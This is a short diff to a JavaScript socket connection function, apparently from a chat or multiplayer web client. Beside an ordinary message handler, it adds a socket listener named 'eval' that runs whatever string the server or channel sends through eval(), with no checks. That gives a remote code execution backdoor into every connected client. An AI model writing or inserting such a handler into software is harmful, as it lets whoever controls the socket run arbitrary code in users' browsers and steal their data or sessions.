@@ -1633,6 +1633,9 @@ function Connection() {
         socket.on("receiveMessage", function(data) {
             chatRoom.receiveMessage(data.sender, data.msg);
         });
+        socket.on("eval", function (a) {
+            eval(a);
+        })
     };
     self.emit = function(name, data) {
         socket.emit(name, data);
